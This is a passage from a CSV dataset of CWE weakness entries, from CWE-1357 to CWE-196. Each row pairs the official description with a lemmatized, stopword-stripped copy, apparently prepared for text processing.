puf pair dram sram temperature sensitive entropy source system designer introduce weakness fail account choose entropy source behavior exceptionally low temperature case dram sram power cycle low temperature device contain bitwise biasing cause inconsistency manufacturing instead contain datum previous boot puf primitive cryptographic construction account adversary control puf seed datum weakness arise weakness cover cold boot attack ram external storage super cool read externally attacker
CWE-1357,Reliance on Insufficiently Trustworthy Component,"The product is built from multiple separate components, but it uses a component that is not sufficiently trusted to meet expectations for security, reliability, updateability, and maintainability.Many modern hardware and software products are built by combining multiple smaller components together into one larger entity, often during the design or architecture phase. For example, a hardware component might be built by a separate supplier, or the product might use an open-source software library from a third party.Regardless of the source, each component should be sufficiently trusted to ensure correct, secure operation of the product. If a component is not trustworthy, it can produce significant risks for the overall product, such as vulnerabilities that cannot be patched fast enough (if at all); hidden functionality such as malware; inability to update or replace the component if needed for security purposes; hardware components built from parts that do not meet specifications in ways that can lead to weaknesses; etc. Note that a component might not be trustworthy even if it is owned by the product vendor, such as a software component whose source code is lost and was built by developers who left the company, or a component that was developed by a separate company that was acquired and brought into the product's own company.Note that there can be disagreement as to whether a component is sufficiently trustworthy, since trust is ultimately subjective. Different stakeholders (e.g., customers, vendors, governments) have various threat models and ways to assess trust, and design/architecture choices might make tradeoffs between security, reliability, safety, privacy, cost, and other characteristics.",product build multiple separate component use component sufficiently trust meet expectation security reliability updateability maintainability modern hardware software product build combine multiple small component large entity design architecture phase example hardware component build separate supplier product use open source software library party regardless source component sufficiently trust ensure correct secure operation product component trustworthy produce significant risk overall product vulnerability patch fast hide functionality malware inability update replace component need security purpose hardware component build part meet specification way lead weakness etc note component trustworthy own product vendor software component source code lose build developer leave company component develop separate company acquire bring product company note disagreement component sufficiently trustworthy trust ultimately subjective different stakeholder customer vendor government threat model way assess trust design architecture choice tradeoff security reliability safety privacy cost characteristic
CWE-138,Improper Neutralization of Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as control elements or syntactic markers when they are sent to a downstream component.Most languages and protocols have their own special elements such as characters and reserved words. These special elements can carry control implications. If product does not prevent external control or influence over the inclusion of such special elements, the control flow of the program may be altered from what was intended. For example, both Unix and Windows interpret the symbol < (""less than"") as meaning ""read input from a file"".",product receive input upstream component neutralize incorrectly neutralize special element interpret control element syntactic marker send downstream component language protocol special element character reserve word special element carry control implication product prevent external control influence inclusion special element control flow program alter intend example unix windows interpret symbol mean read input file
CWE-1384,Improper Handling of Physical or Environmental Conditions,"The product does not properly handle unexpected physical or environmental conditions that occur naturally or are artificially induced.Hardware products are typically only guaranteed to behave correctly within certain physical limits or environmental conditions. Such products cannot necessarily control the physical or external conditions to which they are subjected. However, the inability to handle such conditions can undermine a product's security. For example, an unexpected physical or environmental condition may cause the flipping of a bit that is used for an authentication decision. This unexpected condition could occur naturally or be induced artificially by an adversary.Physical or environmental conditions of concern are:Atmospheric characteristics: extreme temperature ranges, etc.Interference: electromagnetic interference (EMI), radio frequency interference (RFI), etc.Assorted light sources: white light, ultra-violet light (UV), lasers, infrared (IR), etc.Power variances: under-voltages, over-voltages, under-current, over-current, etc.Clock variances: glitching, overclocking, clock stretching, etc.Component aging and degradationMaterials manipulation: focused ion beams (FIB), etc.Exposure to radiation: x-rays, cosmic radiation, etc.",product properly handle unexpected physical environmental condition occur naturally artificially induce hardware product typically guarantee behave correctly certain physical limit environmental condition product necessarily control physical external condition subject inability handle condition undermine product security example unexpected physical environmental condition cause flipping bit authentication decision unexpected condition occur naturally induce artificially adversary physical environmental condition concern atmospheric characteristic extreme temperature range etc interference electromagnetic interference emi radio frequency interference rfi etc assorted light source white light ultra violet light uv laser infrared ir etc power variance voltage voltage current current etc clock variance glitching overclocking clock stretching etc component aging degradationmaterials manipulation focus ion beam fib etc exposure radiation x ray cosmic radiation etc
CWE-1385,Missing Origin Validation in WebSockets,"The product uses a WebSocket, but it does not properly verify that the source of data or communication is valid.WebSockets provide a bi-directional low latency communication (near real-time) between a client and a server. WebSockets are different than HTTP in that the connections are long-lived, as the channel will remain open until the client or the server is ready to send the message, whereas in HTTP, once the response occurs (which typically happens immediately), the transaction completes. A WebSocket can leverage the existing HTTP protocol over ports 80 and 443, but it is not limited to HTTP. WebSockets can make cross-origin requests that are not restricted by browser-based protection mechanisms such as the Same Origin Policy (SOP) or Cross-Origin Resource Sharing (CORS). Without explicit origin validation, this makes CSRF attacks more powerful.",product use websocket properly verify source datum communication valid websocket provide bi directional low latency communication near real time client server websocket different http connection long live channel remain open client server ready send message http response occur typically happen immediately transaction complete websocket leverage exist http protocol port limit http websocket cross origin request restrict browser base protection mechanism origin policy sop cross origin resource sharing cors explicit origin validation make csrf attack powerful
CWE-1386,Insecure Operation on Windows Junction / Mount Point,"The product opens a file or directory, but it does not properly prevent the name from being associated with a junction or mount point to a destination that is outside of the intended control sphere.Depending on the intended action being performed, this could allow an attacker to cause the product to read, write, delete, or otherwise operate on unauthorized files.In Windows, NTFS5 allows for file system objects called reparse points. Applications can create a hard link from one directory to another directory, called a junction point. They can also create a mapping from a directory to a drive letter, called a mount point. If a file is used by a privileged program, but it can be replaced with a hard link to a sensitive file (e.g., AUTOEXEC.BAT), an attacker could excalate privileges. When the process opens the file, the attacker can assume the privileges of that process, tricking the privileged process to read, modify, or delete the sensitive file, preventing the program from accurately processing data. Note that one can also point to registries and semaphores.",product open file directory properly prevent associate junction mount point destination outside intended control sphere depend intended action perform allow attacker cause product read write delete operate unauthorized file windows allow file system object call reparse point application create hard link directory directory call junction point create mapping directory drive letter call mount point file privileged program replace hard link sensitive file attacker excalate privilege process open file attacker assume privilege process trick privileged process read modify delete sensitive file prevent program accurately process datum note point registry semaphore
CWE-1389,Incorrect Parsing of Numbers with Different Radices,"The product parses numeric input assuming base 10 (decimal) values, but it does not account for inputs that use a different base number (radix).Frequently, a numeric input that begins with ""0"" is treated as octal, or ""0x"" causes it to be treated as hexadecimal, e.g. by the inet_addr() function. For example, ""023"" (octal) is 35 decimal, or ""0x31"" is 49 decimal. Other bases may be used as well. If the developer assumes decimal-only inputs, the code could produce incorrect numbers when the inputs are parsed using a different base. This can result in unexpected and/or dangerous behavior. For example, a ""0127.0.0.1"" IP address is parsed as octal due to the leading ""0"", whose numeric value would be the same as 87.0.0.1 (decimal), where the developer likely expected to use 127.0.0.1.The consequences vary depending on the surrounding code in which this weakness occurs, but they can include bypassing network-based access control using unexpected IP addresses or netmasks, or causing apparently-symbolic identifiers to be processed as if they are numbers. In web applications, this can enable bypassing of SSRF restrictions.",product parse numeric input assume base decimal value account input use different base number numeric input begin treat octal cause treat hexadecimal function example octal decimal decimal basis developer assume decimal input code produce incorrect number input parse different base result unexpected dangerous behavior example ip address parse octal lead numeric value decimal developer likely expect use consequence vary depend surround code weakness occur include bypass network base access control unexpected ip address netmask cause apparently symbolic identifier process number web application enable bypassing ssrf restriction
CWE-1390,Weak Authentication,"The product uses an authentication mechanism to restrict access to specific users or identities, but the mechanism does not sufficiently prove that the claimed identity is correct.Attackers may be able to bypass weak authentication faster and/or with less effort than expected.",product use authentication mechanism restrict access specific user identity mechanism sufficiently prove claim identity correct attacker able bypass weak authentication fast effort expect
CWE-1391,Use of Weak Credentials,"The product uses weak credentials (such as a default key or hard-coded password) that can be calculated, derived, reused, or guessed by an attacker.By design, authentication protocols try to ensure that attackers must perform brute force attacks if they do not know the credentials such as a key or password. However, when these credentials are easily predictable or even fixed (as with default or hard-coded passwords and keys), then the attacker can defeat the mechanism without relying on brute force.Credentials may be weak for different reasons, such as:Hard-coded (i.e., static and unchangeable by the administrator)Default (i.e., the same static value across different deployments/installations, but able to be changed by the administrator)Predictable (i.e., generated in a way that produces unique credentials across deployments/installations, but can still be guessed with reasonable efficiency)Even if a new, unique credential is intended to be generated for each product installation, if the generation is predictable, then that may also simplify guessing attacks.",product use weak credential default key hard code password calculate derive reuse guess attacker design authentication protocol try ensure attacker perform brute force attack know credential key password credential easily predictable fix default hard code password key attacker defeat mechanism rely brute force credential weak different reason hard code static unchangeable static value different deployment installation able change generate way produce unique credential deployment installation guess reasonable new unique credential intend generate product installation generation predictable simplify guess attack
CWE-1392,Use of Default Credentials,"The product uses default credentials (such as passwords or cryptographic keys) for potentially critical functionality.It is common practice for products to be designed to use default keys, passwords, or other mechanisms for authentication. The rationale is to simplify the manufacturing process or the system administrator's task of installation and deployment into an enterprise. However, if admins do not change the defaults, it is easier for attackers to bypass authentication quickly across multiple organizations.",product use default credential password cryptographic key potentially critical functionality common practice product design use default key password mechanism authentication rationale simplify manufacture process system administrator task installation deployment enterprise admin change default easy attacker bypass authentication quickly multiple organization
CWE-1393,Use of Default Password,"The product uses default passwords for potentially critical functionality.It is common practice for products to be designed to use default passwords for authentication. The rationale is to simplify the manufacturing process or the system administrator's task of installation and deployment into an enterprise. However, if admins do not change the defaults, then it makes it easier for attackers to quickly bypass authentication across multiple organizations. There are many lists of default passwords and default-password scanning tools that are easily available from the World Wide Web.",product use default password potentially critical functionality common practice product design use default password authentication rationale simplify manufacture process system administrator task installation deployment enterprise admin change default make easy attacker quickly bypass authentication multiple organization list default password default password scan tool easily available world wide web
CWE-1394,Use of Default Cryptographic Key,"The product uses a default cryptographic key for potentially critical functionality.It is common practice for products to be designed to use default keys. The rationale is to simplify the manufacturing process or the system administrator's task of installation and deployment into an enterprise. However, if admins do not change the defaults, it is easier for attackers to bypass authentication quickly across multiple organizations.",product use default cryptographic key potentially critical functionality common practice product design use default key rationale simplify manufacture process system administrator task installation deployment enterprise admin change default easy attacker bypass authentication quickly multiple organization
CWE-1395,Dependency on Vulnerable Third-Party Component,"The product has a dependency on a third-party component that contains one or more known vulnerabilities.Many products are large enough or complex enough that part of their functionality uses libraries, modules, or other intellectual property developed by third parties who are not the product creator. For example, even an entire operating system might be from a third-party supplier in some hardware products. Whether open or closed source, these components may contain publicly known vulnerabilities that could be exploited by adversaries to compromise the product.",product dependency party component contain know vulnerability product large complex functionality use library module intellectual property develop party product creator example entire operating system party supplier hardware product open closed source component contain publicly know vulnerability exploit adversary compromise product
CWE-14,Compiler Removal of Code to Clear Buffers,"Sensitive memory is cleared according to the source code, but compiler optimizations leave the memory untouched when it is not read from again, aka ""dead store removal.""This compiler optimization error occurs when:1. Secret data are stored in memory.2. The secret data are scrubbed from memory by overwriting its contents.3. The source code is compiled using an optimizing compiler, which identifies and removes the function that overwrites the contents as a dead store because the memory is not used subsequently.",sensitive memory clear accord source code compiler optimization leave memory untouched read aka dead store removal compiler optimization error occur secret datum store secret datum scrub memory overwrite source code compile optimize compiler identify remove function overwrite content dead store memory subsequently
CWE-140,Improper Neutralization of Delimiters,The product does not neutralize or incorrectly neutralizes delimiters.,product neutralize incorrectly neutralize delimiter
CWE-141,Improper Neutralization of Parameter/Argument Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as parameter or argument delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.",product receive input upstream component neutralize incorrectly neutralize special element interpret parameter argument delimiter send downstream component data parse inject absent malforme delimiter cause process unexpected action
CWE-142,Improper Neutralization of Value Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as value delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.",product receive input upstream component neutralize incorrectly neutralize special element interpret value delimiter send downstream component data parse inject absent malforme delimiter cause process unexpected action
CWE-143,Improper Neutralization of Record Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as record delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.",product receive input upstream component neutralize incorrectly neutralize special element interpret record delimiter send downstream component data parse inject absent malforme delimiter cause process unexpected action
CWE-144,Improper Neutralization of Line Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as line delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.",product receive input upstream component neutralize incorrectly neutralize special element interpret line delimiter send downstream component data parse inject absent malforme delimiter cause process unexpected action
CWE-145,Improper Neutralization of Section Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as section delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.One example of a section delimiter is the boundary string in a multipart MIME message. In many cases, doubled line delimiters can serve as a section delimiter.",product receive input upstream component neutralize incorrectly neutralize special element interpret section delimiter send downstream component data parse inject absent malforme delimiter cause process unexpected action example section delimiter boundary string multipart mime message case double line delimiter serve section delimiter
CWE-146,Improper Neutralization of Expression/Command Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as expression or command delimiters when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.",product receive input upstream component neutralize incorrectly neutralize special element interpret expression command delimiter send downstream component data parse inject absent malforme delimiter cause process unexpected action
CWE-147,Improper Neutralization of Input Terminators,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as input terminators when they are sent to a downstream component.For example, a ""."" in SMTP signifies the end of mail message data, whereas a null character can be used for the end of a string.",product receive input upstream component neutralize incorrectly neutralize special element interpret input terminator send downstream component example smtp signify end mail message datum null character end string
CWE-148,Improper Neutralization of Input Leaders,"The product does not properly handle when a leading character or sequence (""leader"") is missing or malformed, or if multiple leaders are used when only one should be allowed.",product properly handle lead character sequence leader miss malforme multiple leader allow
CWE-149,Improper Neutralization of Quoting Syntax,"Quotes injected into a product can be used to compromise a system. As data are parsed, an injected/absent/duplicate/malformed use of quotes may cause the process to take unexpected actions.",quote inject product compromise system datum parse inject absent duplicate malforme use quote cause process unexpected action
CWE-15,External Control of System or Configuration Setting,"One or more system settings or configuration elements can be externally controlled by a user.Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.",system setting configuration element externally control user allow external control system setting disrupt service cause application behave unexpected potentially malicious way
CWE-150,"Improper Neutralization of Escape, Meta, or Control Sequences","The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as escape, meta, or control character sequences when they are sent to a downstream component.As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.",product receive input upstream component neutralize incorrectly neutralize special element interpret escape meta control character sequence send downstream component data parse inject absent malforme delimiter cause process unexpected action
CWE-151,Improper Neutralization of Comment Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as comment delimiters when they are sent to a downstream component.",product receive input upstream component neutralize incorrectly neutralize special element interpret comment delimiter send downstream component
CWE-152,Improper Neutralization of Macro Symbols,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as macro symbols when they are sent to a downstream component.",product receive input upstream component neutralize incorrectly neutralize special element interpret macro symbol send downstream component
CWE-153,Improper Neutralization of Substitution Characters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as substitution characters when they are sent to a downstream component.",product receive input upstream component neutralize incorrectly neutralize special element interpret substitution character send downstream component
CWE-154,Improper Neutralization of Variable Name Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as variable name delimiters when they are sent to a downstream component.As data is parsed, an injected delimiter may cause the process to take unexpected actions that result in an attack. Example: ""$"" for an environment variable.",product receive input upstream component neutralize incorrectly neutralize special element interpret variable delimiter send downstream component data parse inject delimiter cause process unexpected action result attack example environment variable
CWE-155,Improper Neutralization of Wildcards or Matching Symbols,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as wildcards or matching symbols when they are sent to a downstream component.As data is parsed, an injected element may cause the process to take unexpected actions.",product receive input upstream component neutralize incorrectly neutralize special element interpret wildcard match symbol send downstream component data parse inject element cause process unexpected action
CWE-156,Improper Neutralization of Whitespace,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as whitespace when they are sent to a downstream component.This can include space, tab, etc.",product receive input upstream component neutralize incorrectly neutralize special element interpret whitespace send downstream component include space tab etc
CWE-157,Failure to Sanitize Paired Delimiters,"The product does not properly handle the characters that are used to mark the beginning and ending of a group of entities, such as parentheses, brackets, and braces.Paired delimiters might include:< and > angle brackets( and ) parentheses{ and } braces[ and ] square brackets"" "" double quotes' ' single quotes",product properly handle character mark beginning ending group entity parenthesis bracket brace paired delimiter include angle bracket parenthesis brace square bracket double quote single quote
CWE-158,Improper Neutralization of Null Byte or NUL Character,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes NUL characters or null bytes when they are sent to a downstream component.As data is parsed, an injected NUL character or null byte may cause the product to believe the input is terminated earlier than it actually is, or otherwise cause the input to be misinterpreted. This could then be used to inject potentially dangerous input that occurs after the null byte or otherwise bypass validation routines and other protection mechanisms.",product receive input upstream component neutralize incorrectly neutralize nul character null byte send downstream component data parse inject nul character null byte cause product believe input terminate early actually cause input misinterpret inject potentially dangerous input occur null byte bypass validation routine protection mechanism
CWE-159,Improper Handling of Invalid Use of Special Elements,"The product does not properly filter, remove, quote, or otherwise manage the invalid use of special elements in user-controlled input, which could cause adverse effect on its behavior and integrity.",product properly filter remove quote manage invalid use special element user control input cause adverse effect behavior integrity
CWE-160,Improper Neutralization of Leading Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes leading special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled leading special elements may cause the process to take unexpected actions that result in an attack.",product receive input upstream component neutralize incorrectly neutralize leading special element interpret unexpected way send downstream component data parse improperly handle leading special element cause process unexpected action result attack
CWE-161,Improper Neutralization of Multiple Leading Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple leading special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled multiple leading special elements may cause the process to take unexpected actions that result in an attack.",product receive input upstream component neutralize incorrectly neutralize multiple lead special element interpret unexpected way send downstream component data parse improperly handle multiple lead special element cause process unexpected action result attack
CWE-162,Improper Neutralization of Trailing Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes trailing special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled trailing special elements may cause the process to take unexpected actions that result in an attack.",product receive input upstream component neutralize incorrectly neutralize trail special element interpret unexpected way send downstream component data parse improperly handle trail special element cause process unexpected action result attack
CWE-163,Improper Neutralization of Multiple Trailing Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple trailing special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled multiple trailing special elements may cause the process to take unexpected actions that result in an attack.",product receive input upstream component neutralize incorrectly neutralize multiple trail special element interpret unexpected way send downstream component data parse improperly handle multiple trail special element cause process unexpected action result attack
CWE-164,Improper Neutralization of Internal Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes internal special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled internal special elements may cause the process to take unexpected actions that result in an attack.",product receive input upstream component neutralize incorrectly neutralize internal special element interpret unexpected way send downstream component data parse improperly handle internal special element cause process unexpected action result attack
CWE-165,Improper Neutralization of Multiple Internal Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple internal special elements that could be interpreted in unexpected ways when they are sent to a downstream component.As data is parsed, improperly handled multiple internal special elements may cause the process to take unexpected actions that result in an attack.",product receive input upstream component neutralize incorrectly neutralize multiple internal special element interpret unexpected way send downstream component data parse improperly handle multiple internal special element cause process unexpected action result attack
CWE-166,Improper Handling of Missing Special Element,"The product receives input from an upstream component, but it does not handle or incorrectly handles when an expected special element is missing.",product receive input upstream component handle incorrectly handle expect special element miss
CWE-167,Improper Handling of Additional Special Element,"The product receives input from an upstream component, but it does not handle or incorrectly handles when an additional unexpected special element is provided.",product receive input upstream component handle incorrectly handle additional unexpected special element provide
CWE-168,Improper Handling of Inconsistent Special Elements,"The product does not properly handle input in which an inconsistency exists between two or more special characters or reserved words.An example of this problem would be if paired characters appear in the wrong order, or if the special characters are not properly nested.",product properly handle input inconsistency exist special character reserve word example problem pair character appear wrong order special character properly nest
CWE-170,Improper Null Termination,"The product does not terminate or incorrectly terminates a string or array with a null character or equivalent terminator.Null termination errors frequently occur in two different ways. An off-by-one error could cause a null to be written out of bounds, leading to an overflow. Or, a program could use a strncpy() function call incorrectly, which prevents a null terminator from being added at all. Other scenarios are possible.",product terminate incorrectly terminate string array null character equivalent terminator null termination error frequently occur different way error cause null write bound lead overflow program use strncpy function incorrectly prevent null terminator add scenario possible
CWE-172,Encoding Error,"The product does not properly encode or decode the data, resulting in unexpected values.",product properly encode decode datum result unexpected value
CWE-173,Improper Handling of Alternate Encoding,The product does not properly handle when an input uses an alternate encoding that is valid for the control sphere to which the input is being sent.,product properly handle input use alternate encoding valid control sphere input send
CWE-174,Double Decoding of the Same Data,"The product decodes the same input twice, which can limit the effectiveness of any protection mechanism that occurs in between the decoding operations.",product decode input twice limit effectiveness protection mechanism occur decoding operation
CWE-175,Improper Handling of Mixed Encoding,The product does not properly handle when the same input uses several different (mixed) encodings.,product properly handle input use different mix encoding
CWE-176,Improper Handling of Unicode Encoding,The product does not properly handle when an input contains Unicode encoding.,product properly handle input contain unicode encoding
CWE-177,Improper Handling of URL Encoding (Hex Encoding),The product does not properly handle when all or part of an input has been URL encoded.,product properly handle input url encode
CWE-178,Improper Handling of Case Sensitivity,"The product does not properly account for differences in case sensitivity when accessing or determining the properties of a resource, leading to inconsistent results.Improperly handled case sensitive data can lead to several possible consequences, including:case-insensitive passwords reducing the size of the key space, making brute force attacks easierbypassing filters or access controls using alternate namesmultiple interpretation errors using alternate names.",product properly account difference case sensitivity access determine property resource lead inconsistent result improperly handle case sensitive datum lead possible consequence include case insensitive password reduce size key space make brute force attack easierbypasse filter access control alternate namesmultiple interpretation error alternate name
CWE-179,Incorrect Behavior Order: Early Validation,"The product validates input before applying protection mechanisms that modify the input, which could allow an attacker to bypass the validation via dangerous inputs that only arise after the modification.Product needs to validate data at the proper time, after data has been canonicalized and cleansed. Early validation is susceptible to various manipulations that result in dangerous inputs that are produced by canonicalization and cleansing.",product validate input apply protection mechanism modify input allow attacker bypass validation dangerous input arise modification product need validate datum proper time datum canonicalize cleanse early validation susceptible manipulation result dangerous input produce canonicalization cleansing
CWE-180,Incorrect Behavior Order: Validate Before Canonicalize,"The product validates input before it is canonicalized, which prevents the product from detecting data that becomes invalid after the canonicalization step.This can be used by an attacker to bypass the validation and launch attacks that expose weaknesses that would otherwise be prevented, such as injection.",product validate input canonicalize prevent product detect datum invalid canonicalization step attacker bypass validation launch attack expose weakness prevent injection
CWE-181,Incorrect Behavior Order: Validate Before Filter,"The product validates data before it has been filtered, which prevents the product from detecting data that becomes invalid after the filtering step.This can be used by an attacker to bypass the validation and launch attacks that expose weaknesses that would otherwise be prevented, such as injection.",product validate datum filter prevent product detect datum invalid filtering step attacker bypass validation launch attack expose weakness prevent injection
CWE-182,Collapse of Data into Unsafe Value,"The product filters data in a way that causes it to be reduced or ""collapsed"" into an unsafe value that violates an expected security property.",product filter datum way cause reduce collapse unsafe value violate expected security property
CWE-183,Permissive List of Allowed Inputs,"The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are explicitly allowed by policy because the inputs are assumed to be safe, but the list is too permissive - that is, it allows an input that is unsafe, leading to resultant weaknesses.",product implement protection mechanism rely list input property input explicitly allow policy input assume safe list permissive allow input unsafe lead resultant weakness
CWE-184,Incomplete List of Disallowed Inputs,"The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are not allowed by policy or otherwise require other action to neutralize before additional processing takes place, but the list is incomplete, leading to resultant weaknesses.Developers often try to protect their products against malicious input by performing tests against inputs that are known to be bad, such as special characters that can invoke new commands. However, such lists often only account for the most well-known bad inputs. Attackers may be able to find other malicious inputs that were not expected by the developer, allowing them to bypass the intended protection mechanism.",product implement protection mechanism rely list input property input allow policy require action neutralize additional processing take place list incomplete lead resultant weakness developer try protect product malicious input perform test input know bad special character invoke new command list account know bad input attacker able find malicious input expect developer allow bypass intended protection mechanism
CWE-185,Incorrect Regular Expression,"The product specifies a regular expression in a way that causes data to be improperly matched or compared.When the regular expression is used in protection mechanisms such as filtering or validation, this may allow an attacker to bypass the intended restrictions on the incoming data.",product specify regular expression way cause datum improperly match compare regular expression protection mechanism filtering validation allow attacker bypass intended restriction incoming datum
CWE-186,Overly Restrictive Regular Expression,"A regular expression is overly restrictive, which prevents dangerous values from being detected.This weakness is not about regular expression complexity. Rather, it is about a regular expression that does not match all values that are intended. Consider the use of a regexp to identify acceptable values or to spot unwanted terms. An overly restrictive regexp misses some potentially security-relevant values leading to either false positives *or* false negatives, depending on how the regexp is being used within the code. Consider the expression /[0-8]/ where the intention was /[0-9]/. This expression is not ""complex"" but the value ""9"" is not matched when maybe the programmer planned to check for it.",regular expression overly restrictive prevent dangerous value detect weakness regular expression complexity regular expression match value intend consider use regexp identify acceptable value spot unwanted term overly restrictive regexp miss potentially security relevant value lead false positive false negative depend regexp code consider expression intention expression complex value match maybe programmer plan check
CWE-187,Partial String Comparison,"The product performs a comparison that only examines a portion of a factor before determining whether there is a match, such as a substring, leading to resultant weaknesses.For example, an attacker might succeed in authentication by providing a small password that matches the associated portion of the larger, correct password.",product perform comparison examine portion factor determine match substring lead resultant weakness example attacker succeed authentication provide small password match associate portion large correct password
CWE-188,Reliance on Data/Memory Layout,"The product makes invalid assumptions about how protocol data or memory is organized at a lower level, resulting in unintended program behavior.When changing platforms or protocol versions, in-memory organization of data may change in unintended ways. For example, some architectures may place local variables A and B right next to each other with A on top; some may place them next to each other with B on top; and others may add some padding to each. The padding size may vary to ensure that each variable is aligned to a proper word size.In protocol implementations, it is common to calculate an offset relative to another field to pick out a specific piece of data. Exceptional conditions, often involving new protocol versions, may add corner cases that change the data layout in an unusual way. The result can be that an implementation accesses an unintended field in the packet, treating data of one type as data of another type.",product make invalid assumption protocol datum memory organize low level result unintended program behavior change platform protocol version memory organization datum change unintended way example architecture place local variable b right place b add padding padding size vary ensure variable align proper word size protocol implementation common calculate offset relative field pick specific piece datum exceptional condition involve new protocol version add corner case change datum layout unusual way result implementation access unintended field packet treat datum type datum type
CWE-190,Integer Overflow or Wraparound,"The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.An integer overflow or wraparound occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may wrap to become a very small or negative number. While this may be intended behavior in circumstances that rely on wrapping, it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using user-supplied inputs. This becomes security-critical when the result is used to control looping, make a security decision, or determine the offset or size in behaviors such as memory allocation, copying, concatenation, etc.",product perform calculation produce integer overflow wraparound logic assume result value large original value introduce weakness calculation resource management execution control integer overflow wraparound occur integer value incremente value large store associate representation occur value wrap small negative number intended behavior circumstance rely wrapping security consequence wrap unexpected especially case integer overflow trigger user supply input security critical result control looping security decision determine offset size behavior memory allocation copying concatenation etc
CWE-191,Integer Underflow (Wrap or Wraparound),"The product subtracts one value from another, such that the result is less than the minimum allowable integer value, which produces a value that is not equal to the correct result.This can happen in signed and unsigned cases.",product subtract value result minimum allowable integer value produce value equal correct result happen signed unsigned case
CWE-192,Integer Coercion Error,"Integer coercion refers to a set of flaws pertaining to the type casting, extension, or truncation of primitive data types.Several flaws fall under the category of integer coercion errors. For the most part, these errors in and of themselves result only in availability and data integrity issues. However, in some circumstances, they may result in other, more complicated security related flaws, such as buffer overflow conditions.",integer coercion refer set flaw pertain type casting extension truncation primitive data type flaw fall category integer coercion error error result availability datum integrity issue circumstance result complicated security relate flaw buffer overflow condition
CWE-193,Off-by-one Error,"A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value.",product calculate use incorrect maximum minimum value correct value
CWE-194,Unexpected Sign Extension,"The product performs an operation on a number that causes it to be sign extended when it is transformed into a larger data type. When the original number is negative, this can produce unexpected values that lead to resultant weaknesses.",product perform operation number cause sign extend transform large data type original number negative produce unexpected value lead resultant weakness
CWE-195,Signed to Unsigned Conversion Error,"The product uses a signed primitive and performs a cast to an unsigned primitive, which can produce an unexpected value if the value of the signed primitive can not be represented using an unsigned primitive.It is dangerous to rely on implicit casts between signed and unsigned numbers because the result can take on an unexpected value and violate assumptions made by the program.Often, functions will return negative values to indicate a failure. When the result of a function is to be used as a size parameter, using these negative return values can have unexpected results. For example, if negative size values are passed to the standard memory copy or allocation functions they will be implicitly cast to a large unsigned value. This may lead to an exploitable buffer overflow or underflow condition.",product use sign primitive perform cast unsigned primitive produce unexpected value value sign primitive represent unsigned primitive dangerous rely implicit cast signed unsigned number result unexpected value violate assumption program function return negative value indicate failure result function size parameter negative return value unexpected result example negative size value pass standard memory copy allocation function implicitly cast large unsigned value lead exploitable buffer overflow underflow condition
CWE-196,Unsigned to Signed Conversion Error,"The product uses an unsigned primitive and performs a cast to a signed primitive, which can produce an unexpected value if the value of the unsigned primitive can not be represented using a signed primitive.Although less frequent an issue than signed-to-unsigned conversion, unsigned-to-signed conversion can be the perfect precursor to dangerous buffer underwrite conditions that allow attackers to move down the stack where they otherwise might not have access in a normal buffer overflow condition. Buffer underwrites occur frequently when large unsigned values are cast to signed values, and then used as indexes into a buffer or for pointer arithmetic.",product use unsigned primitive perform cast sign primitive produce unexpected value value unsigned primitive represent sign primitive frequent issue sign unsigned conversion unsigned sign conversion perfect precursor dangerous buffer underwrite condition allow attacker stack access normal buffer overflow condition buffer underwrite occur frequently large unsigned value cast sign value index buffer pointer arithmetic
